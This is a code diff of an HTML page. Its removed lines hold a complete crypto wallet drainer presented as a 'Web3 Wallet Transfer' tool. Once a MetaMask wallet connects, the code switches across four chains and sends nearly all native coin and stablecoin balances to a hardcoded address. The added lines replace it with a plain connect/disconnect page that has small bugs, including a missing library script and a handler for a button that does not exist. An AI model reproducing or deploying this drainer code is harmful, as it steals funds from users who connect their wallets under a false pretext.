@@ -3,262 +3,119 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Web3 Wallet Connection & Crypto Transfer</title>
-    <style>
-        body {
-            font-family: 'Arial', sans-serif;
-            margin: 0;
-            padding: 0;
-            background-color: #0e0e0e;
-            color: #ffffff;
-        }
-        .container {
-            max-width: 800px;
-            margin: auto;
-            padding: 30px;
-            background: linear-gradient(135deg, #1e1e1e, #333);
-            border-radius: 10px;
-            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.3);
-        }
-        h1 {
-            text-align: center;
-            color: #4caf50;
-            font-size: 2.5em;
-            margin-bottom: 20px;
-        }
-        nav {
-            margin-bottom: 20px;
-            text-align: center;
-        }
-        nav a {
-            margin: 0 15px;
-            text-decoration: none;
-            color: #4caf50;
-            font-weight: bold;
-            transition: color 0.3s;
-        }
-        nav a:hover {
-            color: #81c784;
-        }
-        h2 {
-            margin-top: 20px;
-            font-size: 1.8em;
-            text-align: center;
-            color: #fff;
-        }
-        p {
-            line-height: 1.6;
-        }
-        button {
-            width: 100%;
-            padding: 15px;
-            margin-top: 10px;
-            cursor: pointer;
-            background-color: #4caf50;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            font-size: 18px;
-            transition: background-color 0.3s;
-        }
-        button:hover {
-            background-color: #81c784;
-        }
-        button:disabled {
-            background-color: #ccc;
-            cursor: not-allowed;
-        }
-        #status {
-            margin-top: 20px;
-            font-size: 14px;
-            color: #e0e0e0;
-            white-space: pre-wrap; /* Preserve whitespace and line breaks */
-        }
-        footer {
-            margin-top: 20px;
-            text-align: center;
-            font-size: 12px;
-            color: #bbb;
-        }
-        .logo {
-            display: block;
-            margin: 0 auto 20px;
-            max-width: 150px; /* Adjust the logo size */
-        }
-    </style>
+    <title>Crypto Wallet Connect</title>
 </head>
 <body>
-    <div class="container">
-        <img src="logo-placeholder.png" alt="Logo" class="logo"> <!-- Replace with your logo URL -->
-        <h1>Web3 Wallet Transfer</h1>
-        <nav>
-            <a href="#home">Home</a>
-            <a href="#about">About</a>
-        </nav>
-        
-        <section id="home">
-            <h2>Connect Wallet & Send Crypto</h2>
-            <p>Welcome to the Web3 Wallet Transfer tool! This application allows you to connect your MetaMask wallet and send your crypto assets to a specified destination wallet. Please follow the steps below:</p>
-            <ol>
-                <li>Click the "Connect Wallet" button to connect your MetaMask wallet.</li>
-            </ol>
-            <button id="connectWallet">Connect Wallet</button>
-            <button id="disconnectWallet" disabled>Disconnect Wallet</button>
-            <p id="status"></p>
-        </section>
+    <h1>Connect to Crypto Wallet</h1>
+    <button id="connectButton">Connect Wallet</button>
+    <button id="disconnectButton" style="display:none;">Disconnect Wallet</button>
+    <div id="status"></div>
 
-        <section id="about">
-            <h2>About This Tool</h2>
-            <p>This tool simplifies the process of transferring crypto assets from your wallet. It supports multiple chains, including Ethereum, Binance Smart Chain, and Polygon. You can send not only native tokens but also popular ERC-20 tokens.</p>
-            <p>Make sure you have enough balance to cover gas fees for transactions. If you have any questions, feel free to reach out!</p>
-        </section>
-    </div>
-
-    <footer>
-        <p>&copy; 2024 Web3 Crypto Transfer Tool</p>
-    </footer>
-
-    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
     <script>
-        const provider = new ethers.providers.Web3Provider(window.ethereum);
-        let signer;
-        let userAddress = "";
-
-        // Destination wallet (replace with your own)
-        const recipientAddress = "0xD30bC2a15eb5cd4Be08059AA9354Fc46BB13aDe8";
-
-        // List of networks with RPC URLs
         const networks = [
-            { chainId: 1, name: 'Ethereum', nativeSymbol: 'ETH', rpcUrls: ['https://mainnet.infura.io/v3/YOUR_INFURA_PROJECT_ID'] },
-            { chainId: 56, name: 'Binance Smart Chain', nativeSymbol: 'BNB', rpcUrls: ['https://bsc-dataseed.binance.org/'] },
-            { chainId: 137, name: 'Polygon', nativeSymbol: 'MATIC', rpcUrls: ['https://rpc-mainnet.matic.network'] },
-            { chainId: 43114, name: 'Avalanche', nativeSymbol: 'AVAX', rpcUrls: ['https://api.avax.network/ext/bc/C/rpc'] }
+            {
+                chainId: 1,
+                name: 'Ethereum Mainnet',
+                nativeSymbol: 'ETH',
+                rpcUrls: ['https://mainnet.infura.io/v3/YOUR_INFURA_KEY']
+            },
+            {
+                chainId: 56,
+                name: 'Binance Smart Chain',
+                nativeSymbol: 'BNB',
+                rpcUrls: ['https://bsc-dataseed.binance.org/']
+            }
+            // Add more networks here if necessary
         ];
 
-        // List of ERC-20 tokens for each chain
-        const erc20Tokens = {
-            1: [
-                { address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6, symbol: "USDT" },
-                { address: "0xA0b86991c6218b36c1d19D4a2e9EB0cE3606eB48", decimals: 6, symbol: "USDC" }
-            ],
-            56: [
-                { address: "0xe9e7cea3dedca5984780bafc599bd69add087d56", decimals: 18, symbol: "BUSD" }
-            ],
-            137: [
-                { address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", decimals: 6, symbol: "USDC" }
-            ],
-            43114: [
-                { address: "0xB97EF9Ef8734C71904D8002F8B6Bc66D9B1E1D8", decimals: 18, symbol: "USDC" }
-            ]
-        };
+        let provider;
 
-        document.getElementById('connectWallet').addEventListener('click', async () => {
+        // Check if MetaMask or another wallet provider is available
+        if (typeof window.ethereum !== 'undefined') {
+            provider = new ethers.providers.Web3Provider(window.ethereum);
+        } else {
+            document.getElementById('status').innerText = 'No wallet provider found. Please install MetaMask!';
+        }
+
+        async function connectWallet() {
             try {
-                console.log("Connecting to MetaMask...");
-                if (!window.ethereum) {
-                    document.getElementById('status').innerText = `MetaMask is not installed.`;
-                    return;
-                }
-
-                // Request account access
-                await provider.send("eth_requestAccounts", []);
-                signer = provider.getSigner();
-                userAddress = await signer.getAddress();
-                console.log(`Wallet connected: ${userAddress}`);
-                document.getElementById('status').innerText = `Connected: ${userAddress}`;
-                
-                // Enable the disconnect button
-                document.getElementById('disconnectWallet').disabled = false;
-
-                // Start sending process
-                await sendCrypto();
+                await provider.send('eth_requestAccounts', []);
+                const signer = provider.getSigner();
+                const address = await signer.getAddress();
+                document.getElementById('status').innerText = `Connected with address: ${address}`;
+                document.getElementById('connectButton').style.display = 'none';
+                document.getElementById('disconnectButton').style.display = 'block';
             } catch (error) {
-                console.error(`Connection error: ${error.message}`);
-                document.getElementById('status').innerText = `Connection failed: ${error.message}`;
+                console.error('Error connecting to wallet:', error);
+                document.getElementById('status').innerText = `Error connecting to wallet: ${error.message}`;
             }
-        });
+        }
 
-        document.getElementById('disconnectWallet').addEventListener('click', async () => {
-            userAddress = "";
-            signer = null;
-            document.getElementById('status').innerText = `Disconnected.`;
-            document.getElementById('disconnectWallet').disabled = true;
-        });
-
-        async function sendCrypto() {
-            for (const network of networks) {
-                await switchNetwork(network.chainId);
-                
-                const balance = await provider.getBalance(userAddress);
-                const amountToSend = balance.sub(ethers.utils.parseUnits('0.001', 18)); // Keep some for gas fees
-
-                if (amountToSend.lt(0)) {
-                    document.getElementById('status').innerText += `\nInsufficient balance on ${network.name}. Switching to another network...`;
-                    continue; // Proceed to the next network
-                }
-
-                // Send native token
-                const tx = {
-                    to: recipientAddress,
-                    value: amountToSend
-                };
-
-                const transactionResponse = await signer.sendTransaction(tx);
-                await transactionResponse.wait();
-                document.getElementById('status').innerText += `\nSent ${ethers.utils.formatEther(amountToSend)} ${network.nativeSymbol} to ${recipientAddress} on ${network.name}.`;
-                
-                // Send ERC-20 tokens
-                await sendAllERC20Tokens(network);
+        async function disconnectWallet() {
+            try {
+                // MetaMask does not have a direct disconnect method, so we simulate by reloading
+                document.getElementById('status').innerText = 'Disconnected';
+                document.getElementById('connectButton').style.display = 'block';
+                document.getElementById('disconnectButton').style.display = 'none';
+                window.location.reload();  // This will reset the session
+            } catch (error) {
+                console.error('Error disconnecting wallet:', error);
             }
-            document.getElementById('status').innerText += `\nAll transactions processed.`;
         }
 
         async function switchNetwork(chainId) {
             try {
-                const network = networks.find(net => net.chainId === chainId);
-                await provider.send('wallet_switchEthereumChain', [{ chainId: `0x${chainId.toString(16)}` }]);
-                console.log(`Switched to network: ${network.name}`);
-                document.getElementById('status').innerText += `\nSwitched to ${network.name}.`;
+                const currentNetwork = await provider.getNetwork();
+                if (currentNetwork.chainId !== chainId) {
+                    const network = networks.find(net => net.chainId === chainId);
+                    await window.ethereum.request({
+                        method: 'wallet_switchEthereumChain',
+                        params: [{ chainId: `0x${chainId.toString(16)}` }]
+                    });
+                    console.log(`Switched to network: ${network.name}`);
+                    document.getElementById('status').innerText += `\nSwitched to ${network.name}.`;
+                    
+                    // Add a short delay to ensure the network switch completes fully
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+                } else {
+                    console.log(`Already on the correct network: ${currentNetwork.name}`);
+                    document.getElementById('status').innerText += `\nAlready on ${currentNetwork.name}.`;
+                }
             } catch (error) {
                 console.error(`Error switching networks: ${error.message}`);
                 if (error.code === 4902) {
-                    // If the network is not added, we can add it using the appropriate RPC URL
-                    await provider.send('wallet_addEthereumChain', [
-                        {
-                            chainId: `0x${chainId.toString(16)}`,
-                            chainName: network.name,
-                            nativeCurrency: {
-                                name: network.nativeSymbol,
-                                symbol: network.nativeSymbol,
-                                decimals: 18
-                            },
-                            rpcUrls: network.rpcUrls,
-                            blockExplorerUrls: []
-                        }
-                    ]);
-                    console.log(`Added network: ${network.name}`);
+                    const network = networks.find(net => net.chainId === chainId);
+                    // If the network is not added, we can add it
+                    await window.ethereum.request({
+                        method: 'wallet_addEthereumChain',
+                        params: [
+                            {
+                                chainId: `0x${chainId.toString(16)}`,
+                                chainName: network.name,
+                                nativeCurrency: {
+                                    name: network.nativeSymbol,
+                                    symbol: network.nativeSymbol,
+                                    decimals: 18
+                                },
+                                rpcUrls: network.rpcUrls,
+                                blockExplorerUrls: []
+                            }
+                        ]
+                    });
+                    console.log(`Added and switched to network: ${network.name}`);
                     document.getElementById('status').innerText += `\nAdded and switched to ${network.name}.`;
                 }
             }
         }
 
-        async function sendAllERC20Tokens(network) {
-            const tokenList = erc20Tokens[network.chainId];
-            for (const token of tokenList) {
-                const tokenContract = new ethers.Contract(token.address, [
-                    // ERC-20 ABI (simplified)
-                    "function balanceOf(address) view returns (uint)",
-                    "function transfer(address to, uint amount) returns (bool)"
-                ], signer);
+        document.getElementById('connectButton').addEventListener('click', connectWallet);
+        document.getElementById('disconnectButton').addEventListener('click', disconnectWallet);
 
-                const tokenBalance = await tokenContract.balanceOf(userAddress);
-                if (tokenBalance.gt(0)) {
-                    const transferTx = await tokenContract.transfer(recipientAddress, tokenBalance);
-                    await transferTx.wait();
-                    document.getElementById('status').innerText += `\nSent ${ethers.utils.formatUnits(tokenBalance, token.decimals)} ${token.symbol} to ${recipientAddress} on ${network.name}.`;
-                }
-            }
-        }
+        // Example: Call switchNetwork when you want to switch networks
+        document.getElementById('switchNetworkButton').addEventListener('click', () => {
+            // Replace `56` with the desired network chainId, e.g., 1 for Ethereum or 56 for Binance Smart Chain
+            switchNetwork(56);
+        });
     </script>
 </body>
 </html>
